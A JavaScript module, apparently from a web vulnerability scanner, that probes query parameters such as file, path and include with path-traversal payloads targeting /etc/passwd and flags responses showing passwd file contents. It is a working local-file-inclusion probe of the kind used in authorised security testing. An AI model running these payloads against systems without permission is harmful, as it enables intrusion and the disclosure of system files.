import { curlWebSingle } from './web-curl-single.js';

const SUSPECT_PARAM_RE = /^(file|filepath|path|page|include|inc|template|view|doc|folder|root|lang|style|module|load|download|dir)$/i;
const PASSWD_PAYLOADS = [
  '/etc/passwd',
  '../etc/passwd',
  '../../etc/passwd',
  '../../../etc/passwd',
  '../../../../etc/passwd',
  '..%2f..%2f..%2f..%2fetc%2fpasswd',
  '%2fetc%2fpasswd',
];

function looksLikePasswdDump(bodyText) {
  const t = String(bodyText || '').toLowerCase();
  return t.includes('root:x:0:0:') || t.includes('daemon:x:1:1:') || t.includes('/bin/bash') || t.includes('/usr/sbin/nologin');
}

function uniqueQueryUrls(urls) {
  const out = [];
  const seen = new Set();
  for (const u of urls || []) {
    try {
      const x = new URL(String(u || ''));
      if (!x.search) continue;
      x.hash = '';
      const k = x.href;
      if (seen.has(k)) continue;
      seen.add(k);
      out.push(x.href);
    } catch {
      /* ignore */
    }
  }
  return out;
}

export async function runLfiPasswdProbe({
  urls,
  log,
  maxAttempts = 24,
  timeoutMs = 12000,
  maxBodyBytes = 180_000,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const results = [];
  let attempts = 0;

  const queryUrls = uniqueQueryUrls(urls);
  for (const base of queryUrls) {
    if (attempts >= maxAttempts) break;
    let u;
    try {
      u = new URL(base);
    } catch {
      continue;
    }
    const suspectParams = [...u.searchParams.keys()].filter((k) => SUSPECT_PARAM_RE.test(String(k || '').trim()));
    if (!suspectParams.length) continue;

    for (const p of suspectParams) {
      if (attempts >= maxAttempts) break;
      for (const payload of PASSWD_PAYLOADS) {
        if (attempts >= maxAttempts) break;
        attempts += 1;
        const test = new URL(u.href);
        test.searchParams.set(p, payload);
        const testUrl = test.href;
        try {
          logger(`[lfi] teste passwd: ${testUrl}`, 'info');
          const r = await curlWebSingle({ url: testUrl, timeoutMs, maxBodyBytes });
          if (!r || !r.bodyText) continue;
          if (!looksLikePasswdDump(r.bodyText)) continue;

          results.push({
            ok: true,
            baseUrl: u.href,
            testUrl,
            param: p,
            payload,
            status: Number(r.status) || 0,
            evidence: 'assinatura /etc/passwd no corpo',
            snippet: String(r.bodyText).slice(0, 200).replace(/\s+/g, ' ').trim(),
          });
          break;
        } catch {
          /* ignore network errors */
        }
      }
    }
  }

  return { attempts, hits: results };
}
